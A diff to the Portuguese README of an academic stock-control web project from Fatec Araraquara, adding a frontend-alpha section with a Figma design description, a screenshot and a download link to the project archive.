@@ -42,3 +42,15 @@ Sistema web para controle de estoque de pequenas empresas: cadastro de produtos,
 ## 📄 Licença
 
 Projeto acadêmico — Fatec Araraquara.
+
+
+## (α) Alfa do frontend
+
+projeto inicial feito totalmente no figma, construção de paleta de cores, e parte inicial de armazenamento, saída e entrada de produtos;
+o auxilio da IA e o seu uso de forma inteligente ajuda a clarear as ideias e organizá-lás de forma visual
+
+<img width="1440" height="808" alt="image" src="https://github.com/user-attachments/assets/d6370900-88d1-40e4-84a9-9a4ca61508c5" />
+
+demonstração de como está do desenvolvimento do front
+
+📥 **[Download do Projeto (.RAR)](https://github.com/user-attachments/files/32343805/Inventory.Management.System.zip)**
